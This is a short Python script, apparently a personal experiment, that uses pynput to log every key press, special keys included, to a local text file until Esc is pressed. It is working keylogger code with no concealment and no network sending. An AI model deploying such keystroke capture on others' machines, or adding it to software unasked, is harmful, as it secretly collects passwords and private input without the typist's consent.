from pynput import keyboard

# Path to the log file
log_file_path = "C:/Users/User/Desktop/Bit level permutation research material/other part/Elgamal encryption/keylog.txt"

def on_press(key):
    """Callback function that gets called on each key press."""
    try:
        # Log the key as a string
        with open(log_file_path, "a") as log_file:
            log_file.write(f'{key.char}')
    except AttributeError:
        # Handle special keys like Shift, Ctrl, etc.
        with open(log_file_path, "a") as log_file:
            log_file.write(f'[{key}]')

def on_release(key):
    """Callback function that gets called when a key is released."""
    # Stop the listener when Esc key is pressed
    if key == keyboard.Key.esc:
        return False

def start_keylogger():
    """Start the keylogger."""
    # Set up the listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
